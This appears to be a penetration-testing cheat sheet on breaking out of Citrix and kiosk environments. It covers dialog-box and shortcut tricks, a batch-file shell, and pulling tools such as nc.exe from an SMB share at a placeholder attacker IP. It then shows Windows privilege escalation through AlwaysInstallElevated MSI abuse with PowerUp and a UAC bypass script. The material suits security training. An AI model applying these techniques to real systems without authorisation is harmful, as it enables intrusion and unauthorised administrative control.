# Restricted Environments
## Citrix / Kiosk Breakout Techniques
**Concept:** Restricted environments (Citrix, Kiosks) rely on UI restrictions (Group Policies) to hide the filesystem and command prompt. These restrictions are merely visual barriers, not security boundaries.
### 1. Dialog Box Breakout
**Goal:** Use standard "Open/Save" dialogs to navigate the filesystem or launch executables. 
**Scenario:** You have access to a published application like Notepad or Paint.
- **Execution:**    
    1. Open `File` -> `Open` (or `Save As`).
    2. In the filename bar, bypass hidden drives by typing UNC paths:
        - `\\127.0.0.1\c$\Windows\System32\cmd.exe`
        - `C:\Windows\System32\`
    3. Right-click `cmd.exe` -> `Open` or set "File Type" to `*.*` and run scripts.
### 2. UNC Path Injection (SMB)
**Goal:** Access tools stored on your attacker machine if local execution/download is blocked. 
**Scenario:** File Explorer blocks access to local drives, but network navigation is open.

1. **Host Tools:**
    ```shell
    # Attacker machine
    sudo python3 smbserver.py share . -smb2support
    ```
2. **Access via Dialog:** In the dialog box (Notepad/Paint), type: `\\<ATTACKER_IP>\share`.
3. **Execute:** Right-click a tool (e.g., `Explorer++.exe` or `nc.exe`) -> `Open`.
### 3. Alternate File Managers
**Concept:** If `explorer.exe` is restricted or killed, run a portable file manager to regain GUI navigation. **Tools:**
- **Explorer++:** Lightweight, portable file manager.
- **Q-Dir:** Multi-pane file manager.
- **7-Zip:** The file manager GUI (`7zFM.exe`) allows full navigation and execution.
### 4. Shortcut Modification (.lnk)
**Goal:** Hijack an existing shortcut to run `cmd.exe`.
1. Right-click a shortcut on the Desktop (or in a File Dialog).
2. **Properties** -> **Target**.
3. Change path to: `C:\Windows\System32\cmd.exe`.
4. Run the shortcut.
### 5. Script Execution (.bat / .vbs)
**Concept:** If the environment allows creating files (e.g., via "Save As"), create a script to spawn a shell.
1. Open Notepad.
2. Type `cmd.exe` or `start powershell.exe`.
3. Save as `breakout.bat`.
4. Double-click (or Right-click -> Open) the file.
## Post-Breakout Privilege Escalation
**Concept:** Once a shell is obtained, standard Windows escalation applies. However, restricted environments often have specific misconfigurations like `AlwaysInstallElevated`.
### 1. AlwaysInstallElevated (MSI Abuse)
**Vulnerability:** A registry setting allowing non-admins to install `.msi` packages with SYSTEM privileges.
**Enumeration:**
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
- **Vulnerable:** Both return `0x1`.

**Exploitation (PowerUp):**
```powershell
Import-Module .\PowerUp.ps1
Write-UserAddMSI
# Creates UserAdd.msi
# Run the MSI to add a local admin
```
### 2. User Account Control (UAC) Bypass
**Scenario:** You have compromised a local administrator account (e.g., via the MSI exploit), but are restricted by UAC (High Integrity processes are blocked).
**Exploitation:** Use a UAC bypass technique to elevate the shell to High Integrity.
```powershell
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```
- **Result:** A new PowerShell window spawns with full Administrative privileges, bypassing filesystem restrictions on `C:\Users\Administrator`.